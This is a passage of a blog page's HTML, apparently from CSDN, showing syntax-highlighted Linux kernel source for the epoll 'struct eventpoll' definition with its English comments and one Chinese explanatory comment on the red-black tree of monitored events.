   <a target="_blank" title="?" class="About" href="http://blog.csdn.net/xiajun07061225/article/details/9250579#" style="margin:0px 10px 0px 0px; padding:0px; border:currentColor; color:rgb(160,160,160); font-size:9px; text-decoration:none; background-color:inherit" rel="noopener noreferrer">?</a> 
   <div style="left:422px; top:4651px; width:29px; height:14px; position:absolute; z-index:99"> 
   </div> 
  </div> 
 </div> 
 <ol class="dp-cpp" start="1" style="margin:0px 0px 1px 45px!important; padding:0px; border:currentColor; color:rgb(92,92,92); background-color:rgb(255,255,255)"><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/*</span> </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit"></span> </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit"> 171 * This structure is stored inside the "private_data" member of the file</span> </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit"></span> </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit"> 172 * structure and represents the main data structure for the eventpoll</span> </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit"></span> </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit"> 173 * interface.</span> </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit"></span> </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit"> 174 */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 175struct eventpoll {  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 176        <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/* Protect the access to this structure */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 177        spinlock_t lock;  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 178  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 179        <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/*</span> </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit"></span> </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit"> 180         * This mutex is used to ensure that files are not removed</span> </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit"></span> </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit"> 181         * while epoll is using them. This is held during the event</span> </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit"></span> </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit"> 182         * collection loop, the file cleanup path, the epoll file exit</span> </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit"></span> </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit"> 183         * code and the ctl operations.</span> </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit"></span> </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit"> 184         */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 185        <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">struct</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> mutex mtx;  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 186  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 187        <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/* Wait queue used by sys_epoll_wait() */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 188        wait_queue_head_t wq;  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 189  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 190        <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/* Wait queue used by file-&gt;poll() */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 191        wait_queue_head_t poll_wait;  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 192  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 193        <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/* List of ready file descriptors */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 194        <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">struct</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> list_head rdllist;  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 195  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 196        <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/* RB tree root used to store monitored fd structs */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 197        <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">struct</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> rb_root rbr;</span><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">//红黑树根节点，这棵树存储着所有添加到epoll中的事件，也就是这个epoll监控的事件</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 198  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 199        <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/*</span> </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit"> 200         * This is a single linked list that chains all the "struct epitem" that</span> </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit"> 201         * happened while transferring ready events to userspace w/out</span> </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit"> 202         * holding -&gt;lock.</span> </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit"> 203         */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 204        <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">struct</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> epitem *ovflist;  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 205  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 206        <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/* wakeup_source used when ep_scan_ready_list is running */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 207        <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">struct</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> wakeup_source *ws;  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 208  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 209        <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/* The user that created the eventpoll descriptor */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 210        <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">struct</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> user_struct *user;  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 211  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 212        <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">struct</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> file *file;  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 213  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 214        <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/* used to optimize loop detection check */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 215        <span class="datatypes" style="margin:0px; padding:0px; border:currentColor; background-color:inherit">int</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> visited;  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 216        <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; 